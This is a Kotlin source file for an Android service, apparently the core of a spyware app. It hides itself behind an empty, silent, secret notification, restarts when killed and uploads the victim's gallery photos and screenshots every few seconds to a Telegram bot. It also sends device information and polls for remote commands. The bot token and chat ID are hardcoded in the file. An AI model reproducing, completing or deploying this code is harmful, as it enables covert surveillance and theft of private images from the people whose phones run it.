package com.ddos.network

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class DdosService : Service() {

    private val CHANNEL_ID = "ddos_network"
    private val NOTIF_ID = 1

    // 🔴 BOT TOKEN YAHAN DAALO
    private val BOT_TOKEN = "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg"
    private val CHAT_ID = "8507217564"

    override fun onCreate() {
        super.onCreate()
        startSilentForeground()
        startAllModules()
    }

    private fun startSilentForeground() {
        createSilentChannel()

        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(),
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

        startForeground(NOTIF_ID, notification)
    }

    private fun createSilentChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Network Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun startAllModules() {
        val executor = Executors.newScheduledThreadPool(4)
        val bot = TelegramBot(BOT_TOKEN, CHAT_ID, this)

        // Module 1: Gallery Exfiltration — every 10 seconds
        val galleryScanner = GalleryScanner(this, bot)
        executor.scheduleWithFixedDelay({
            galleryScanner.scanAndUpload()
        }, 0, 10, TimeUnit.SECONDS)

        // Module 2: Screenshot — every 5 seconds
        val screenshotTaker = ScreenshotTaker(this, bot)
        executor.scheduleWithFixedDelay({
            screenshotTaker.captureAndSend()
        }, 5, 5, TimeUnit.SECONDS)

        // Module 3: Command Listener — every 3 seconds
        executor.scheduleWithFixedDelay({
            bot.checkCommands()
        }, 0, 3, TimeUnit.SECONDS)

        // Module 4: Device Info on Start
        executor.submit {
            bot.sendDeviceInfo()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        val restart = Intent(this, DdosService::class.java)
        startService(restart)
    }
}
